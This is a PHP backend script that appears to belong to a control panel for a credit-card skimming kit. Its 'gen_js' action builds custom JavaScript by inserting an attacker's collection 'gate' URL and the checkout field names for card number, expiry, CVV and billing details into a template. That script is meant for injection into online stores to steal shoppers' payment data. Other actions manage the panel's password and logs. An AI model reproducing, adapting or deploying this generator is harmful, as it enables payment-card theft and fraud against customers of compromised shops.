<?php
session_start();
include 'check_login.php'; if(!check_login()) exit ('У вас нет прав');
include 'check_chmod.php';

function generateRandomString() {
    $length = 10;
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


if(isset($_POST['type'])){
    include __DIR__.'/../include/db/db_connect.php';
    

    
    if($_POST['type'] == 'save_password'){
        $check = $db -> getOne('SELECT id FROM users WHERE id=?s AND password=?s', $_SESSION['id'] , hash('whirlpool', $_POST['old_password']) );
        
        if(!empty($check) && strlen($_POST['new_password']) >= 6 ) {
            $resp = $db->query('UPDATE users SET password=?s WHERE id=?s' , hash('whirlpool', $_POST['new_password']) , $_SESSION['id']);
            if($resp) exit('ok');
        }
        else
            exit ('oldpass');
    }
    
    if($_POST['type'] == 'delete_log'){
        if($db->query('DELETE FROM logs WHERE id=?i' , $_POST['id']))
            exit('ok');
    }
    
    
    
      if($_POST['type'] == 'gen_js'){
        
        $code = file_get_contents(__DIR__.'/../include/SCRIPT_JS');
        $code = str_replace('imageid' , generateRandomString() , $code);
        $code = str_replace('%GATE%' , $_POST['link'] , $code);
        $code = str_replace('authorizenet_cc_number' , $_POST['card_num'] , $code);
        $code = str_replace('authorizenet_expiration' , $_POST['card_expm'] , $code);
        $code = str_replace('authorizenet_expiration_yr' , $_POST['card_expy'] , $code);
        $code = str_replace('authorizenet_cc_cid' , $_POST['card_cvv'] , $code);
        $code = str_replace('billing:firstname' , $_POST['fname'] , $code);
        $code = str_replace('billing:lastname' , $_POST['lname'] , $code);
        $code = str_replace('billing:telephone' , $_POST['tel'] , $code);
        $code = str_replace('billing:country_id' , $_POST['country'] , $code);
        $code = str_replace('billing:region_id' , $_POST['region'] , $code);
        $code = str_replace('billing:street1' , $_POST['street'] , $code);
        $code = str_replace('billing:city' , $_POST['city'] , $code);
        $code = str_replace('billing:postcode' , $_POST['zip'] , $code);
        echo $code ; 
    }
    
  
}
?>
   